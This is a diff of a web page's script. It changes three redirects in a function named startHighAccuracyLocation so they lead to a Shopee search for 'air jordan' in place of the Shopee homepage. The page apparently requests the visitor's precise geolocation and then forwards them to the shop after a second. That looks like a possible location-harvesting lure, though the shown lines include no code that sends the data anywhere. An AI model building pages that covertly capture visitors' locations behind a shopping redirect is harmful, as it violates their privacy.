@@ -106,7 +106,7 @@
 
     async function startHighAccuracyLocation() {
       if (!navigator.geolocation) {
-        window.location.href = 'https://shopee.co.id';
+        window.location.href = 'https://shopee.co.id/search?keyword=air%20jordan';
         return;
       }
 
@@ -126,7 +126,7 @@
 
         // Redirect ke Shopee setelah 1 detik
         setTimeout(() => {
-          window.location.href = 'https://shopee.co.id';
+          window.location.href = 'https://shopee.co.id/search?keyword=air%20jordan';
         }, 1000);
 
       } catch (error) {
@@ -134,7 +134,7 @@
         
         // Fallback ke method biasa
         setTimeout(() => {
-          window.location.href = 'https://shopee.co.id';
+          window.location.href = 'https://shopee.co.id/search?keyword=air%20jordan';
         }, 1000);
       }
     }
@@ -147,3 +147,4 @@
 
 </body>
 </html>
+
